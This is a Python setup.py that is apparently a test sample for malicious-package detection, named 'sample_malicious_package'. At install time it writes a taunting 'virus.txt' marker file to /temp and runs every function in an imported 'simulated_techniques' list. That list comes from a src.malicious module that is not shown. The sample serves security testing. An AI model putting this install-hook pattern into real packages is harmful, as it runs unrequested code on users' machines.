import sys
import os
from datetime import datetime
from pathlib import Path
from setuptools import setup, find_packages
from src.malicious import *

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(SCRIPT_DIR)

setup(name="sample_malicious_package",packages=find_packages(),)

try:
    Path("/temp").mkdir(parents=True, exist_ok=True)
    with open("/temp/virus.txt", "w", encoding="utf-8") as buffer:
        buffer.write(f"I was here at {datetime.now()} ;>")
except Exception as e:
    print(f"An error occurred while writing to /temp/virus.txt: {e}")

try:
    [f("setup.py", True) for f in simulated_techniques]
except Exception as e:
    print(f"An error occurred while executing simulated techniques: {e}")
